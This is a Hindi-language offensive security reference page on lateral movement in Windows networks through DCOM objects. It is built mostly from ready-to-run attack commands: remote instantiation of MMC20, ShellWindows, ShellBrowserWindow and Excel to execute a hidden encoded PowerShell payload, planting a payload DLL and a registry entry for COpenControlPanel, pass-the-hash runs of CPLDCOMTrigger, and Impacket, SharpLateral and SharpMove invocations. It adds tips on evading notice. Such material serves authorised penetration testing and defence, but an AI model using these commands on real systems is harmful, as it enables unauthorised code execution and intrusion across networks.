# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement आकर्षक है, क्योंकि इसमें service या scheduled task बनाने के बजाय RPC/DCOM पर उपलब्ध मौजूदा COM servers का दोबारा उपयोग किया जाता है। आम तौर पर शुरुआती connection TCP/135 पर शुरू होता है और फिर dynamically assigned high RPC ports पर चला जाता है।

## आवश्यकताएँ और ध्यान रखने योग्य बातें

- आम तौर पर target पर local administrator context चाहिए, और remote COM server को remote launch/activation की अनुमति देनी चाहिए।
- **14 मार्च, 2023** से Microsoft समर्थित systems पर DCOM hardening लागू करता है। पुराने clients, जो कम activation authentication level का अनुरोध करते हैं, तब तक fail हो सकते हैं जब तक वे कम-से-कम `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` पर negotiate न करें। आधुनिक Windows clients का authentication level आम तौर पर अपने-आप बढ़ जाता है, इसलिए मौजूदा tooling सामान्यतः काम करती रहती है।<sup>[[3]](#references)</sup>
- Manual या scripted DCOM execution के लिए आम तौर पर TCP/135 और target की dynamic RPC port range की ज़रूरत होती है। यदि आप Impacket के `dcomexec.py` का उपयोग कर रहे हैं और command output वापस चाहिए, तो आम तौर पर `ADMIN$` (या किसी अन्य writable/readable share) तक SMB access भी चाहिए।
- यदि RPC/DCOM काम करता है, लेकिन SMB blocked है, तो blind execution के लिए `dcomexec.py -nooutput` फिर भी उपयोगी हो सकता है।

त्वरित जाँचें:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

इस technique के बारे में अधिक जानकारी के लिए, [मूल MMC20.Application पोस्ट](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) देखें।<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objects, objects के साथ network-based interactions के लिए एक दिलचस्प क्षमता प्रदान करते हैं। Microsoft, DCOM और Component Object Model (COM) दोनों के लिए व्यापक documentation उपलब्ध कराता है, जिसे [यहाँ DCOM के लिए](https://msdn.microsoft.com/en-us/library/cc226801.aspx) और [यहाँ COM के लिए](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) देखा जा सकता है। PowerShell command का उपयोग करके DCOM applications की सूची प्राप्त की जा सकती है:

```bash
Get-CimInstance Win32_DCOMApplication
```

COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC snap-in operations की scripting सक्षम करता है। खास तौर पर, इस object में `Document.ActiveView` के अंतर्गत `ExecuteShellCommand` method मौजूद है। इस method के बारे में अधिक जानकारी [यहाँ](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) मिल सकती है। इसे चलाकर देखें:<sup>[[6]](#references)</sup>

यह सुविधा DCOM application के ज़रिए network पर commands चलाने में मदद करती है। DCOM के साथ दूरस्थ रूप से admin के तौर पर interact करने के लिए, PowerShell का उपयोग इस तरह किया जा सकता है:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

यह command DCOM application से connect करता है और COM object का एक instance लौटाता है। इसके बाद remote host पर process execute करने के लिए ExecuteShellCommand method को invoke किया जा सकता है। इस process में ये steps शामिल हैं:

विधियों की जाँच करें:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

RCE प्राप्त करें:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

आखिरी आर्ग्युमेंट window style है। `7` विंडो को minimized रखता है। व्यवहार में, MMC-आधारित execution में आम तौर पर remote `mmc.exe` process आपका payload spawn करता है, जो नीचे दिए गए Explorer-backed objects से अलग है।

## ShellWindows & ShellBrowserWindow

**इस technique के बारे में अधिक जानकारी के लिए मूल पोस्ट देखें [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

**MMC20.Application** object में application-specific `LaunchPermission` value मौजूद नहीं देखी गई थी।<sup>[[2]](#references)</sup> इससे अपने-आप access नहीं मिलता: लागू होने पर COM, machine के `DefaultLaunchPermission` ACL और machine-wide launch/access restrictions की जाँच करता है।<sup>[[9]](#references)[[10]](#references)</sup> अधिक जानकारी के लिए [यहाँ](https://twitter.com/tiraniddo/status/817532039771525120) मौजूद thread देखा जा सकता है। साथ ही, explicit Launch Permission के बिना objects को filter करने के लिए [@tiraniddo](https://twitter.com/tiraniddo) के OleView .NET का उपयोग करने की सलाह दी जाती है।

दो विशिष्ट objects, `ShellBrowserWindow` और `ShellWindows`, को explicit Launch Permissions की कमी के कारण रेखांकित किया गया था।<sup>[[2]](#references)</sup> `HKCR:\AppID\{guid}` के अंतर्गत `LaunchPermission` value मौजूद न होने का मतलब है कि कोई application-specific launch ACL नहीं है; इसका **यह मतलब नहीं** है कि remote activation पर कोई पाबंदी नहीं है।<sup>[[9]](#references)[[10]](#references)</sup>

`MMC20.Application` की तुलना में, OPSEC के नज़रिए से ये objects अक्सर अधिक शांत रहते हैं, क्योंकि remote host पर command आम तौर पर `mmc.exe` के बजाय `explorer.exe` की child process बन जाती है।

### ShellWindows

`ShellWindows` के लिए, जिसमें ProgID नहीं है, .NET methods `Type.GetTypeFromCLSID` और `Activator.CreateInstance` इसके CLSID का उपयोग करके object का instance बनाने में मदद करते हैं। इस प्रक्रिया में `ShellWindows` का CLSID पाने के लिए OleView .NET का उपयोग किया जाता है। Instance बनने के बाद, `WindowsShell.Item` method के ज़रिए interaction किया जा सकता है, जिससे `Document.Application.ShellExecute` जैसे method invoke होते हैं।<sup>[[2]](#references)</sup>

Object का instance बनाने और remotely commands execute करने के लिए PowerShell commands के उदाहरण दिए गए थे:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` इससे मिलता-जुलता है, लेकिन आप इसे सीधे इसके CLSID के ज़रिए इंस्टैंशिएट कर सकते हैं और `Document.Application.ShellExecute` पर pivot कर सकते हैं:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Excel DCOM Objects के साथ Lateral Movement

DCOM Excel objects का exploit करके Lateral Movement किया जा सकता है। विस्तृत जानकारी के लिए, DCOM के ज़रिए Lateral Movement के लिए Excel DDE का लाभ उठाने पर [Cybereason के blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) में दी गई चर्चा पढ़ने की सलाह दी जाती है।<sup>[[5]](#references)</sup>

Empire project में एक PowerShell script है, जो दिखाती है कि DCOM objects में बदलाव करके remote code execution (RCE) के लिए Excel का उपयोग कैसे किया जा सकता है। नीचे [Empire के GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) में उपलब्ध script के कुछ अंश दिए गए हैं, जो RCE के लिए Excel का दुरुपयोग करने के अलग-अलग तरीके दिखाते हैं:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

हालिया research ने `Excel.Application` के `ActivateMicrosoftApp()` method के साथ इस क्षेत्र का विस्तार किया। मुख्य विचार यह है कि Excel, system `PATH` में खोज करके FoxPro, Schedule Plus या Project जैसे पुराने Microsoft applications launch करने की कोशिश कर सकता है। अगर कोई operator, target के `PATH` में शामिल किसी writable location पर इन अपेक्षित नामों में से किसी एक नाम वाला payload रख सके, तो Excel उसे execute करेगा।<sup>[[4]](#references)</sup>

इस variation के लिए आवश्यकताएँ:

- target पर Local admin access
- target पर Excel installed होना
- target के `PATH` में किसी writable directory में payload लिखने की क्षमता

FoxPro lookup (`FOXPROW.exe`) का दुरुपयोग करने वाला व्यावहारिक उदाहरण:

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

यदि attacking host पर local `Excel.Application` ProgID registered नहीं है, तो इसके बजाय CLSID का उपयोग करके remote object instantiate करें:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

व्यवहार में दुरुपयोग किए गए मान:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — registered Control Panel DLL लोड करना

`COpenControlPanel` class (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`) को expose करती है। इसका `Open()` method, `Control Panel\Cpls` key के तहत registered Control Panel DLLs को remote `dllhost.exe` द्वारा लोड करवाता है। परीक्षण किए गए systems पर इस class के लिए कोई explicit launch/access permissions नहीं हैं, इसलिए यह default DCOM policy का उपयोग करती है (जिसमें आम तौर पर remote activation के लिए administrator की आवश्यकता होती है)। किसी भी random item name से `Open()` registered DLLs को process कर सकता है; payload को `.cpl` extension की आवश्यकता नहीं है, लेकिन उसे सही architecture की valid DLL होना चाहिए।<sup>[[7]](#references)</sup>

यह primitive **stage-and-trigger** है, केवल command से execution नहीं: पहले target पर DLL copy करें और उसे point करने वाली `REG_EXPAND_SZ` value बनाएँ, फिर DCOM के ज़रिए object activate करें। उदाहरण के लिए, administrative Windows context से:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

सार्वजनिक [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) client, Impacket के साथ undocumented DCOM call को लागू करता है। कोई भी मनमाना Control Panel item name देना पर्याप्त है; client RPC error दिखा सकता है, भले ही `dllhost.exe` ने DLL load कर ली हो।<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

व्यावहारिक रूप से, इस path के लिए file-write channel और remote registry access की भी ज़रूरत होती है, इसलिए यह `MMC20`/`ShellWindows` से ज़्यादा शोर करता है। इससे persistence का side effect बनता है, क्योंकि बाद में Control Panel खोलने पर वही entry फिर से load हो सकती है। Execution के बाद value हटाएँ और `dllhost.exe` में असामान्य DLL loads के साथ अप्रत्याशित `Control Panel\Cpls` values की जाँच करें।<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Lateral Movement के लिए Automation Tools

इन techniques को automate करने के लिए दो tools बताए गए हैं:

- **Invoke-DCOM.ps1**: Empire project द्वारा उपलब्ध कराया गया PowerShell script, जो remote machines पर code execute करने के विभिन्न तरीकों को आसान बनाता है। यह script Empire GitHub repository पर उपलब्ध है।

- **SharpLateral**: Remote रूप से code execute करने के लिए बनाया गया tool, जिसे इस command के साथ इस्तेमाल किया जा सकता है:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## स्वचालित टूल्स

- Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) दूसरे मशीनों पर code execute करने के सभी टिप्पणी किए गए तरीकों को आसानी से invoke करने की सुविधा देता है।
- DCOM का उपयोग करके remote systems पर commands execute करने के लिए Impacket के `dcomexec.py` का उपयोग किया जा सकता है। मौजूदा builds `ShellWindows`, `ShellBrowserWindow` और `MMC20` को support करते हैं, और default रूप से `ShellWindows` का उपयोग करते हैं।

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- आप [**SharpLateral**](https://github.com/mertdas/SharpLateral) का भी उपयोग कर सकते हैं:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- आप [**SharpMove**](https://github.com/0xthirteen/SharpMove) का भी उपयोग कर सकते हैं.

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [Lateral Movement using MMC20.Application COM Object के जरिए](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [DCOM के जरिए Lateral Movement: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass (CVE-2021-26414) के बदलाव प्रबंधित करें](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: DCOM Excel Application की शक्ति का दुरुपयोग](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM के जरिए lateral movement के लिए Excel DDE का उपयोग](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Remote command execution के लिए DCOM objects का उपयोग](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: Appendix B, Product Behavior - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
